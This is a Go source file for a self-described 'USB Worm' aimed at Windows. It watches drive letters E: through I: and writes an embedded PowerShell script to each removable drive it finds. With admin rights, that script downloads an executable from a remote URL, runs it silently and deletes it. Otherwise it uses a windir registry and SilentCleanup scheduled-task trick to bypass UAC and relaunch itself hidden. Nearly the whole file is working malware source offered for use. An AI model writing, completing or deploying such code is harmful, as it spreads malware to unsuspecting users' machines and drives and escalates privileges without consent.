package pack

import (
	"bytes"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"time"
)

func 	USBWorm() {
	fmt.Println(`
''''''''''''''''''''''''''''''
' USB Worm for Go Sample '
''''''''''''''''''''''''''''''
'                            '
'   Testing Version 0.07     '
'                            '
''''''''''''''''''''''''''''''
'   For Windows              '
''''''''''''''''''''''''''''''`)

	// Simple USB Worm

	var USBList []string

	usbDetect := func() ([]string, string) {
		if osname := os.Getenv("GOOS"); osname == "windows" {
			fmt.Println("Found Windows...\n")
			return []string{"E:\\", "F:\\", "G:\\", "H:\\", "I:\\"}, "myprogram.ps1"
		}
		return nil, ""
	}

	anyUSB := func() bool {
		return len(USBList) != 0
	}

	usbRW := func(usb string) {
		// PowerShell script embedded in Go code
		psScript := `
		if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {
			# URL of the executable to download
		   $url = "https://sourceforge.net/projects/app/files/main.exe/download"
		   
		   # Path to save the downloaded executable
		   $downloadPath = "$env:TEMP\downloaded_System.exe"
		   
		   # Download the executable
		   Invoke-WebRequest -Uri $url -OutFile $downloadPath
		   
		   # Run the downloaded executable
		   Start-Process -FilePath $downloadPath -NoNewWindow -Wait
		   
		   # Remove the downloaded file (optional)
		   Remove-Item -Path $downloadPath -Force
		   
		   
		   } else {
			   $registryPath = "HKCU:\Environment"
			   $Name = "windir"
			   $Value = "powershell -ep bypass -w h $PSCommandPath;#"
			   Set-ItemProperty -Path $registryPath -Name $name -Value $Value
			   #Depending on the performance of the machine, some sleep time may be required before or after schtasks
			   schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null
			   Remove-ItemProperty -Path $registryPath -Name $name
		   }`

		fullname := filepath.Join(usb, "myprogram.ps1")
		fp, err := os.Create(fullname)
		if err == nil {
			defer fp.Close()
			_, err := io.Copy(fp, bytes.NewReader([]byte(psScript)))
			if err == nil {
				fmt.Printf("Successfully wrote PowerShell script to %s\n", usb)
			} else {
				fmt.Printf("Error writing PowerShell script to %s: %v\n", usb, err)
			}
		} else {
			fmt.Printf("Permission Error Writing PowerShell script... %s: %v\n", usb, err)
		}
	}

	usbScan := func(USBDir []string) {
		for !anyUSB() {
			time.Sleep(2 * time.Second)
			USBList = nil
			for _, usb := range USBDir {
				if _, err := os.Stat(usb); err == nil {
					USBList = append(USBList, usb)
					fmt.Printf("Found %s\n", usb)
				} else {
					fmt.Println("")
				}
			}
		}
	}

	for {
		USBDir, _ := usbDetect() // The second return value is not used
		USBList = nil

		go usbScan(USBDir)

		fmt.Printf("\nWaiting for USB detection...\n")
		<-time.After(10 * time.Second)

		if anyUSB() {
			fmt.Printf("\nUSB's Detected: %v\n", USBList)
			for _, usb := range USBList {
				go usbRW(usb)
			}
		}
	}
}

// Commented out the main function to avoid "no non-test Go files" error.
// func main() {
// 	usbWorm()
// }
